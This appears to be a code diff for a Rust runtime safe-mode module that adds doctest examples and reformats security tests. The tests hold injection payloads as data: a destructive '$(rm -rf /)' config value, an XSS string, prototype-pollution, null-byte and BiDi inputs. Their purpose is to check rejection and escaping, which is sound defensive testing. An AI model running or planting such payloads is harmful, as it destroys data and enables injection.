@@ -139,6 +139,16 @@ pub struct OperationFlags {
 
 impl OperationFlags {
     /// Create flags with all options disabled.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::OperationFlags;
+    ///
+    /// let flags = OperationFlags::none();
+    /// assert!(!flags.any_active());
+    /// assert!(flags.active_flag_names().is_empty());
+    /// ```
     pub fn none() -> Self {
         Self {
             safe_mode: false,
@@ -149,6 +159,16 @@ impl OperationFlags {
     }
 
     /// Create flags with only safe-mode enabled.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::OperationFlags;
+    ///
+    /// let flags = OperationFlags::safe_mode_only();
+    /// assert!(flags.safe_mode);
+    /// assert_eq!(flags.active_flag_names(), vec!["--safe-mode"]);
+    /// ```
     pub fn safe_mode_only() -> Self {
         Self {
             safe_mode: true,
@@ -162,6 +182,19 @@ impl OperationFlags {
     ///
     /// Returns `Err` if an unknown flag is encountered.
     /// INV-SMO-FLAGPARSE: Deterministic parsing, unknown flags produce structured error.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// # fn main() -> Result<(), Box<dyn std::error::Error>> {
+    /// use frankenengine_node::runtime::safe_mode::OperationFlags;
+    ///
+    /// let flags = OperationFlags::parse_args(&["--safe-mode", "--no-network"])?;
+    /// assert!(flags.safe_mode);
+    /// assert!(flags.no_network);
+    /// # Ok(())
+    /// # }
+    /// ```
     pub fn parse_args(args: &[&str]) -> Result<Self, SafeModeError> {
         let mut flags = Self::none();
         for &arg in args {
@@ -184,6 +217,16 @@ impl OperationFlags {
     }
 
     /// Detect flag conflicts and return advisory event codes.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{OperationFlags, SMO_003_FLAG_CONFLICT};
+    ///
+    /// let flags = OperationFlags { safe_mode: true, degraded: true, read_only: false, no_network: false };
+    /// let conflicts = flags.detect_conflicts();
+    /// assert_eq!(conflicts[0].code, SMO_003_FLAG_CONFLICT);
+    /// ```
     pub fn detect_conflicts(&self) -> Vec<SafeModeEvent> {
         let mut events = Vec::new();
         // SMO-003: safe-mode + degraded is redundant.
@@ -200,11 +243,29 @@ impl OperationFlags {
     }
 
     /// Check whether any restrictive flag is active.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::OperationFlags;
+    ///
+    /// assert!(!OperationFlags::none().any_active());
+    /// assert!(OperationFlags::safe_mode_only().any_active());
+    /// ```
     pub fn any_active(&self) -> bool {
         self.safe_mode || self.degraded || self.read_only || self.no_network
     }
 
     /// Return the set of active flag names (sorted for determinism).
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::OperationFlags;
+    ///
+    /// let flags = OperationFlags { safe_mode: true, degraded: false, read_only: true, no_network: false };
+    /// assert_eq!(flags.active_flag_names(), vec!["--safe-mode", "--read-only"]);
+    /// ```
     pub fn active_flag_names(&self) -> Vec<String> {
         let mut names = Vec::new();
         if self.safe_mode {
@@ -242,6 +303,15 @@ pub enum Capability {
 
 impl Capability {
     /// Return all defined capabilities.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::Capability;
+    ///
+    /// let capabilities = Capability::all();
+    /// assert!(capabilities.contains(&Capability::OutboundNetwork));
+    /// ```
     pub fn all() -> Vec<Self> {
         vec![
             Self::ExtensionLoading,
@@ -254,6 +324,14 @@ impl Capability {
     }
 
     /// Return the human-readable label for this capability.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::Capability;
+    ///
+    /// assert_eq!(Capability::TrustLedgerWrites.label(), "trust_ledger_writes");
+    /// ```
     pub fn label(&self) -> &'static str {
         match self {
             Self::ExtensionLoading => "extension_loading",
@@ -512,6 +590,24 @@ fn derive_receipt_disposition(
 
 impl SafeModeEntryReceipt {
     /// Create a new entry receipt with anomaly classifications and disposition.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{
+    ///     DegradedDisposition, SafeModeEntryReason, SafeModeEntryReceipt,
+    /// };
+    ///
+    /// let receipt = SafeModeEntryReceipt::new(
+    ///     "2026-04-25T00:00:00Z",
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    ///     Vec::new(),
+    /// );
+    /// assert_eq!(receipt.disposition, DegradedDisposition::Normal);
+    /// assert!(receipt.pass);
+    /// ```
     pub fn new(
         timestamp: &str,
         entry_reason: SafeModeEntryReason,
@@ -539,6 +635,25 @@ impl SafeModeEntryReceipt {
     }
 
     /// Serialize to canonical JSON.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// # fn main() -> Result<(), Box<dyn std::error::Error>> {
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeEntryReason, SafeModeEntryReceipt};
+    ///
+    /// let receipt = SafeModeEntryReceipt::new(
+    ///     "2026-04-25T00:00:00Z",
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    ///     Vec::new(),
+    /// );
+    /// let json = receipt.to_json()?;
+    /// assert!(json.contains("trust_proof_digest"));
+    /// # Ok(())
+    /// # }
+    /// ```
     pub fn to_json(&self) -> Result<String, serde_json::Error> {
         serde_json::to_string_pretty(self)
     }
@@ -555,6 +670,20 @@ pub struct ExitVerification {
 
 impl ExitVerification {
     /// Check whether all pre-exit conditions are met.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::ExitVerification;
+    ///
+    /// let verification = ExitVerification {
+    ///     trust_state_consistent: true,
+    ///     no_unresolved_incidents: true,
+    ///     evidence_ledger_intact: true,
+    ///     operator_confirmed: true,
+    /// };
+    /// assert!(verification.all_passed());
+    /// ```
     pub fn all_passed(&self) -> bool {
         self.trust_state_consistent
             && self.no_unresolved_incidents
@@ -563,6 +692,20 @@ impl ExitVerification {
     }
 
     /// Return the list of failed checks.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::ExitVerification;
+    ///
+    /// let verification = ExitVerification {
+    ///     trust_state_consistent: false,
+    ///     no_unresolved_incidents: true,
+    ///     evidence_ledger_intact: true,
+    ///     operator_confirmed: false,
+    /// };
+    /// assert_eq!(verification.failed_checks(), vec!["trust_state_consistent", "operator_confirmed"]);
+    /// ```
     pub fn failed_checks(&self) -> Vec<String> {
         let mut failed = Vec::new();
         if !self.trust_state_consistent {
@@ -596,6 +739,16 @@ pub struct SafeModeStatus {
 
 impl SafeModeStatus {
     /// Create an inactive status report.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::SafeModeStatus;
+    ///
+    /// let status = SafeModeStatus::inactive();
+    /// assert!(!status.safe_mode_active);
+    /// assert!(status.suspended_capabilities.is_empty());
+    /// ```
     pub fn inactive() -> Self {
         Self {
             safe_mode_active: false,
@@ -610,6 +763,18 @@ impl SafeModeStatus {
     }
 
     /// Serialize to canonical JSON.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// # fn main() -> Result<(), Box<dyn std::error::Error>> {
+    /// use frankenengine_node::runtime::safe_mode::SafeModeStatus;
+    ///
+    /// let json = SafeModeStatus::inactive().to_json()?;
+    /// assert!(json.contains("safe_mode_active"));
+    /// # Ok(())
+    /// # }
+    /// ```
     pub fn to_json(&self) -> Result<String, serde_json::Error> {
         serde_json::to_string_pretty(self)
     }
@@ -670,6 +835,15 @@ pub struct SafeModeController {
 
 impl SafeModeController {
     /// Create a new controller with default configuration.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeConfig, SafeModeController};
+    ///
+    /// let controller = SafeModeController::new(SafeModeConfig::default());
+    /// assert!(!controller.is_active());
+    /// ```
     pub fn new(config: SafeModeConfig) -> Self {
         Self {
             active: false,
@@ -686,6 +860,15 @@ impl SafeModeController {
     }
 
     /// Create a controller with default config.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::SafeModeController;
+    ///
+    /// let controller = SafeModeController::with_default_config();
+    /// assert_eq!(controller.config().env_var_name, "FRANKEN_SAFE_MODE");
+    /// ```
     pub fn with_default_config() -> Self {
         Self::new(SafeModeConfig::default())
     }
@@ -701,6 +884,22 @@ impl SafeModeController {
     /// Enter safe mode with the given reason and timestamp.
     ///
     /// INV-SMO-DETERMINISTIC: The resulting state is a pure function of the inputs.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// assert!(controller.is_active());
+    /// assert!(controller.entry_receipt().is_some());
+    /// ```
     pub fn enter_safe_mode(
         &mut self,
         reason: SafeModeEntryReason,
@@ -776,6 +975,20 @@ impl SafeModeController {
     }
 
     /// Enter degraded state (automatic trigger).
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_degraded_state(
+    ///     SafeModeEntryReason::CrashLoop { crash_count: 4, window_secs: 60 },
+    ///     "2026-04-25T00:00:00Z",
+    /// );
+    /// assert!(controller.is_active());
+    /// assert!(!controller.events().is_empty());
+    /// ```
     pub fn enter_degraded_state(&mut self, reason: SafeModeEntryReason, timestamp: &str) {
         // Emit SMO-004 for degraded state.
         self.emit_event(SafeModeEvent {
@@ -791,6 +1004,33 @@ impl SafeModeController {
     /// Attempt to exit safe mode.
     ///
     /// INV-SMO-RECOVERY: Exit requires explicit operator action and verification.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// # fn main() -> Result<(), Box<dyn std::error::Error>> {
+    /// use frankenengine_node::runtime::safe_mode::{
+    ///     ExitVerification, SafeModeController, SafeModeEntryReason,
+    /// };
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// let verification = ExitVerification {
+    ///     trust_state_consistent: true,
+    ///     no_unresolved_incidents: true,
+    ///     evidence_ledger_intact: true,
+    ///     operator_confirmed: true,
+    /// };
+    /// controller.exit_safe_mode(&verification, "operator-a", "2026-04-25T00:01:00Z")?;
+    /// assert!(!controller.is_active());
+    /// # Ok(())
+    /// # }
+    /// ```
     pub fn exit_safe_mode(
         &mut self,
         verification: &ExitVerification,
@@ -856,6 +1096,23 @@ impl SafeModeController {
     /// Check whether a capability is restricted.
     ///
     /// INV-SMO-RESTRICTED: Returns structured error if restricted.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{
+    ///     Capability, SafeModeController, SafeModeEntryReason,
+    /// };
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// assert!(controller.check_capability(&Capability::OutboundNetwork).is_err());
+    /// ```
     pub fn check_capability(&self, capability: &Capability) -> Result<(), SafeModeError> {
         if self.restricted_capabilities.contains(capability) {
             Err(SafeModeError::CapabilityRestricted {
@@ -871,16 +1128,55 @@ impl SafeModeController {
     }
 
     /// Whether safe mode is currently active.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::SafeModeController;
+    ///
+    /// let controller = SafeModeController::with_default_config();
+    /// assert!(!controller.is_active());
+    /// ```
     pub fn is_active(&self) -> bool {
         self.active
     }
 
     /// The entry reason, if safe mode is active.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// assert_eq!(controller.entry_reason(), Some(&SafeModeEntryReason::ExplicitFlag));
+    /// ```
     pub fn entry_reason(&self) -> Option<&SafeModeEntryReason> {
         self.entry_reason.as_ref()
     }
 
     /// Set operation flags and detect conflicts.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{OperationFlags, SafeModeController};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.set_flags(OperationFlags {
+    ///     safe_mode: true,
+    ///     degraded: true,
+    ///     read_only: false,
+    ///     no_network: false,
+    /// });
+    /// assert_eq!(controller.events().len(), 1);
+    /// ```
     pub fn set_flags(&mut self, flags: OperationFlags) {
         let conflicts = flags.detect_conflicts();
         for conflict in conflicts {
@@ -890,16 +1186,57 @@ impl SafeModeController {
     }
 
     /// Get current operation flags.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{OperationFlags, SafeModeController};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.set_flags(OperationFlags::safe_mode_only());
+    /// assert!(controller.flags().safe_mode);
+    /// ```
     pub fn flags(&self) -> &OperationFlags {
         &self.flags
     }
 
     /// Get the entry receipt.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// assert!(controller.entry_receipt().is_none());
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// assert!(controller.entry_receipt().is_some());
+    /// ```
     pub fn entry_receipt(&self) -> Option<&SafeModeEntryReceipt> {
         self.entry_receipt.as_ref()
     }
 
     /// Get the list of suspended capability labels (sorted for determinism).
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// assert!(controller.suspended_capabilities().contains(&"outbound_network".to_string()));
+    /// ```
     pub fn suspended_capabilities(&self) -> Vec<String> {
         self.restricted_capabilities
             .iter()
@@ -908,6 +1245,23 @@ impl SafeModeController {
     }
 
     /// Get current safe-mode status.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// let status = controller.status("2026-04-25T00:02:00Z");
+    /// assert!(status.safe_mode_active);
+    /// assert_eq!(status.duration_seconds, 120);
+    /// ```
     pub fn status(&self, current_timestamp: &str) -> SafeModeStatus {
         if !self.active {
             return SafeModeStatus::inactive();
@@ -938,26 +1292,99 @@ impl SafeModeController {
     }
 
     /// Get all emitted events.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// assert!(!controller.events().is_empty());
+    /// ```
     pub fn events(&self) -> &[SafeModeEvent] {
         &self.events
     }
 
     /// Take and drain all emitted events.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// let events = controller.take_events();
+    /// assert!(!events.is_empty());
+    /// assert!(controller.events().is_empty());
+    /// ```
     pub fn take_events(&mut self) -> Vec<SafeModeEvent> {
         std::mem::take(&mut self.events)
     }
 
     /// Get the audit log.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// assert_eq!(controller.audit_log().len(), 1);
+    /// ```
     pub fn audit_log(&self) -> &[SafeModeAuditEntry] {
         &self.audit_log
     }
 
     /// Set unresolved incident count.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let mut controller = SafeModeController::with_default_config();
+    /// controller.enter_safe_mode(
+    ///     SafeModeEntryReason::ExplicitFlag,
+    ///     "2026-04-25T00:00:00Z",
+    ///     "sha256:trusted",
+    ///     Vec::new(),
+    /// );
+    /// controller.set_unresolved_incidents(2);
+    /// assert_eq!(controller.status("2026-04-25T00:00:00Z").unresolved_incidents, 2);
+    /// ```
     pub fn set_unresolved_incidents(&mut self, count: u32) {
         self.unresolved_incidents = count;
     }
 
     /// Get the safe-mode configuration.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeConfig, SafeModeController};
+    ///
+    /// let config = SafeModeConfig { safe_mode: true, ..SafeModeConfig::default() };
+    /// let controller = SafeModeController::new(config);
+    /// assert!(controller.config().safe_mode);
+    /// ```
     pub fn config(&self) -> &SafeModeConfig {
         &self.config
     }
@@ -965,6 +1392,18 @@ impl SafeModeController {
     /// Determine safe-mode activation from all trigger sources.
     ///
     /// INV-SMO-DETERMINISTIC: Evaluates triggers in strict precedence order.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{
+    ///     OperationFlags, SafeModeController, SafeModeEntryReason,
+    /// };
+    ///
+    /// let controller = SafeModeController::with_default_config();
+    /// let reason = controller.evaluate_triggers(&OperationFlags::none(), Some("true"), false);
+    /// assert_eq!(reason, Some(SafeModeEntryReason::EnvironmentVariable));
+    /// ```
     pub fn evaluate_triggers(
         &self,
         flags: &OperationFlags,
@@ -994,6 +1433,19 @@ impl SafeModeController {
     }
 
     /// Check crash loop trigger.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let controller = SafeModeController::with_default_config();
+    /// let reason = controller.check_crash_loop_trigger(3, 60);
+    /// assert_eq!(
+    ///     reason,
+    ///     Some(SafeModeEntryReason::CrashLoop { crash_count: 3, window_secs: 60 })
+    /// );
+    /// ```
     pub fn check_crash_loop_trigger(
         &self,
         crash_count: u32,
@@ -1010,6 +1462,18 @@ impl SafeModeController {
     }
 
     /// Check epoch mismatch trigger.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{SafeModeController, SafeModeEntryReason};
+    ///
+    /// let controller = SafeModeController::with_default_config();
+    /// assert_eq!(
+    ///     controller.check_epoch_mismatch_trigger(7, 8),
+    ///     Some(SafeModeEntryReason::EpochMismatch { local_epoch: 7, peer_epoch: 8 })
+    /// );
+    /// ```
     pub fn check_epoch_mismatch_trigger(
         &self,
         local_epoch: u64,
@@ -1028,6 +1492,19 @@ impl SafeModeController {
     /// Compute the restricted capability set for given flags.
     ///
     /// INV-SMO-DETERMINISTIC: Pure function of flags.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{
+    ///     Capability, OperationFlags, SafeModeController,
+    /// };
+    ///
+    /// let flags = OperationFlags { safe_mode: false, degraded: false, read_only: true, no_network: true };
+    /// let restricted = SafeModeController::compute_restricted_capabilities(&flags);
+    /// assert!(restricted.contains(&Capability::TrustLedgerWrites));
+    /// assert!(restricted.contains(&Capability::OutboundNetwork));
+    /// ```
     pub fn compute_restricted_capabilities(flags: &OperationFlags) -> BTreeSet<Capability> {
         let mut restricted = BTreeSet::new();
         if flags.safe_mode {
@@ -1057,6 +1534,27 @@ impl SafeModeController {
     /// This is the real trust-verification path: it computes a SHA-256 digest
     /// over all evidence entries, verifies the digest against the claimed
     /// trust state hash, checks evidence freshness, and classifies anomalies.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::{
+    ///     SafeModeController, SafeModeEntryReason, TrustVerificationInput,
+    /// };
+    ///
+    /// let evidence = vec!["entry-a".to_string(), "entry-b".to_string()];
+    /// let trust_state_hash = SafeModeController::compute_evidence_digest(&evidence);
+    /// let receipt = SafeModeController::verify_trust_state(&TrustVerificationInput {
+    ///     trust_state_hash,
+    ///     evidence_entries: evidence,
+    ///     current_epoch: 10,
+    ///     last_evidence_epoch: 9,
+    ///     staleness_threshold: 5,
+    ///     entry_reason: SafeModeEntryReason::ExplicitFlag,
+    ///     timestamp: "2026-04-25T00:00:00Z".to_string(),
+    /// });
+    /// assert!(receipt.pass);
+    /// ```
     pub fn verify_trust_state(input: &TrustVerificationInput) -> SafeModeEntryReceipt {
         let mut inconsistencies = Vec::new();
         let mut anomalies = Vec::new();
@@ -1140,6 +1638,15 @@ impl SafeModeController {
 
     /// Convenience: compute the evidence digest for a set of evidence entries.
     /// This allows callers to produce a matching trust_state_hash.
+    ///
+    /// # Examples
+    ///
+    /// ```
+    /// use frankenengine_node::runtime::safe_mode::SafeModeController;
+    ///
+    /// let digest = SafeModeController::compute_evidence_digest(&["entry-a".to_string()]);
+    /// assert!(digest.starts_with("sha256:"));
+    /// ```
     pub fn compute_evidence_digest(evidence_entries: &[String]) -> String {
         let mut hasher = Sha256::new();
         hasher.update(b"safe_mode_evidence_digest_v1:");
@@ -2915,20 +3422,26 @@ mod tests {
 
         // BiDi override + zero-width characters in flag names
         let malicious_args = vec![
-            "\u{202E}--safe-mode\u{202D}",  // BiDi override
-            "--safe-mode\u{200B}\u{200C}\u{200D}",  // Zero-width chars
-            "--safe-\u{FEFF}mode",  // Zero-width no-break space
-            "--\u{200E}degraded\u{200F}",  // LTR/RTL marks
+            "\u{202E}--safe-mode\u{202D}",         // BiDi override
+            "--safe-mode\u{200B}\u{200C}\u{200D}", // Zero-width chars
+            "--safe-\u{FEFF}mode",                 // Zero-width no-break space
+            "--\u{200E}degraded\u{200F}",          // LTR/RTL marks
         ];
 
         for arg in malicious_args {
             let result = OperationFlags::parse_args(&[arg]);
-            assert!(result.is_err(), "Should reject Unicode injection in flag: {}", arg);
+            assert!(
+                result.is_err(),
+                "Should reject Unicode injection in flag: {}",
+                arg
+            );
 
             if let Err(SafeModeError::UnknownFlag { flag, .. }) = result {
                 // Ensure error message doesn't contain injected Unicode
-                assert!(!constant_time::ct_eq(flag.as_bytes(), b"--safe-mode"),
-                       "Flag parsing vulnerable to Unicode normalization");
+                assert!(
+                    !constant_time::ct_eq(flag.as_bytes(), b"--safe-mode"),
+                    "Flag parsing vulnerable to Unicode normalization"
+                );
             }
         }
     }
@@ -2972,18 +3485,27 @@ mod tests {
         // All capabilities should be restricted
         for capability in Capability::all() {
             let result = ctrl.check_capability(&capability);
-            assert!(result.is_err(),
-                   "Capability {:?} should be restricted in safe mode", capability);
+            assert!(
+                result.is_err(),
+                "Capability {:?} should be restricted in safe mode",
+                capability
+            );
 
-            if let Err(SafeModeError::CapabilityRestricted { capability: cap, .. }) = result {
+            if let Err(SafeModeError::CapabilityRestricted {
+                capability: cap, ..
+            }) = result
+            {
                 assert_eq!(cap, capability, "Error should reference correct capability");
             }
         }
 
         // Verify restriction persists across multiple checks
         for _ in 0..1000 {
-            assert!(ctrl.check_capability(&Capability::ExtensionLoading).is_err(),
-                   "Restriction should persist across repeated checks");
+            assert!(
+                ctrl.check_capability(&Capability::ExtensionLoading)
+                    .is_err(),
+                "Restriction should persist across repeated checks"
+            );
         }
     }
 
@@ -2993,10 +3515,10 @@ mod tests {
 
         // Test malformed JSON with injection attempts
         let malicious_configs = vec![
-            r#"{"safe_mode": true, "__proto__": {"polluted": "yes"}}"#,  // Prototype pollution
-            r#"{"safe_mode": true, "crash_loop_threshold": 18446744073709551615}"#,  // u64::MAX
-            r#"{"safe_mode": true, "env_var_name": "\u{0000}FRANKEN_SAFE_MODE"}"#,  // Null injection
-            r#"{"safe_mode": true, "env_var_name": "$(rm -rf /)"}"#,  // Command injection
+            r#"{"safe_mode": true, "__proto__": {"polluted": "yes"}}"#, // Prototype pollution
+            r#"{"safe_mode": true, "crash_loop_threshold": 18446744073709551615}"#, // u64::MAX
+            r#"{"safe_mode": true, "env_var_name": "\u{0000}FRANKEN_SAFE_MODE"}"#, // Null injection
+            r#"{"safe_mode": true, "env_var_name": "$(rm -rf /)"}"#,    // Command injection
         ];
 
         for malicious_json in malicious_configs {
@@ -3004,13 +3526,22 @@ mod tests {
 
             if let Ok(config) = result {
                 // If parsing succeeded, verify security properties
-                assert!(config.crash_loop_threshold < 1000000,
-                       "Threshold should be bounded to prevent DoS");
-                assert!(!config.env_var_name.contains('\0'),
-                       "Environment variable name should not contain null bytes");
-                assert!(constant_time::ct_eq(config.env_var_name.as_bytes(), b"FRANKEN_SAFE_MODE") ||
-                       config.env_var_name.chars().all(|c| c.is_alphanumeric() || c == '_'),
-                       "Environment variable name should be sanitized");
+                assert!(
+                    config.crash_loop_threshold < 1000000,
+                    "Threshold should be bounded to prevent DoS"
+                );
+                assert!(
+                    !config.env_var_name.contains('\0'),
+                    "Environment variable name should not contain null bytes"
+                );
+                assert!(
+                    constant_time::ct_eq(config.env_var_name.as_bytes(), b"FRANKEN_SAFE_MODE")
+                        || config
+                            .env_var_name
+                            .chars()
+                            .all(|c| c.is_alphanumeric() || c == '_'),
+                    "Environment variable name should be sanitized"
+                );
             }
         }
     }
@@ -3021,10 +3552,10 @@ mod tests {
 
         // Attempt to forge receipts with malicious data
         let receipt = SafeModeEntryReceipt::new(
-            "2026-04-17T10:00:00Z\u{0000}FORGED",  // Null injection in timestamp
+            "2026-04-17T10:00:00Z\u{0000}FORGED", // Null injection in timestamp
             SafeModeEntryReason::TrustCorruption,
-            "sha256:fake\nsha256:real",  // Newline injection in hash
-            vec!["legit issue".to_string(), "\u{202E}hidden".to_string()],  // BiDi in inconsistencies
+            "sha256:fake\nsha256:real", // Newline injection in hash
+            vec!["legit issue".to_string(), "\u{202E}hidden".to_string()], // BiDi in inconsistencies
             vec![],
         );
 
@@ -3038,13 +3569,18 @@ mod tests {
 
         if let Ok(json) = json_result {
             // Verify no injection vulnerabilities in JSON
-            assert!(!json.contains("FORGED"), "Timestamp injection should not appear in JSON");
+            assert!(
+                !json.contains("FORGED"),
+                "Timestamp injection should not appear in JSON"
+            );
             assert!(!json.contains("\n"), "Newline injection should be escaped");
         }
 
         // Constant-time comparison of trust hashes should be used
-        assert!(!constant_time::ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:real"),
-               "Hash comparison should not extract injected content");
+        assert!(
+            !constant_time::ct_eq(receipt.trust_state_hash.as_bytes(), b"sha256:real"),
+            "Hash comparison should not extract injected content"
+        );
     }
 
     #[test]
@@ -3057,12 +3593,18 @@ mod tests {
 
         // Display should handle overflow gracefully
         let display_str = format!("{}", crash_reason);
-        assert!(display_str.contains("crash_loop"), "Display should show crash_loop type");
+        assert!(
+            display_str.contains("crash_loop"),
+            "Display should show crash_loop type"
+        );
 
         // JSON serialization should preserve exact values
         let json = serde_json::to_string(&crash_reason).expect("serialize");
         let parsed: SafeModeEntryReason = serde_json::from_str(&json).expect("deserialize");
-        assert_eq!(crash_reason, parsed, "Serialization should preserve values exactly");
+        assert_eq!(
+            crash_reason, parsed,
+            "Serialization should preserve values exactly"
+        );
 
         // Test epoch mismatch with extreme values
         let epoch_reason = SafeModeEntryReason::EpochMismatch {
@@ -3071,7 +3613,10 @@ mod tests {
         };
 
         let epoch_display = format!("{}", epoch_reason);
-        assert!(epoch_display.contains("epoch_mismatch"), "Display should show epoch_mismatch type");
+        assert!(
+            epoch_display.contains("epoch_mismatch"),
+            "Display should show epoch_mismatch type"
+        );
     }
 
     #[test]
@@ -3083,20 +3628,27 @@ mod tests {
             safe_mode_active: true,
             entry_reason: Some(SafeModeEntryReason::TrustCorruption),
             restricted_capabilities: Capability::all(),
-            entry_timestamp: "2026-04-17T10:00:00Z\";alert('xss');//".to_string(),  // JS injection
+            entry_timestamp: "2026-04-17T10:00:00Z\";alert('xss');//".to_string(), // JS injection
             entry_receipt: None,
         };
 
         // JSON serialization should escape injection attempts
         let json = status.to_json().expect("serialization should succeed");
-        assert!(!json.contains("alert('xss')"), "JavaScript injection should be escaped");
+        assert!(
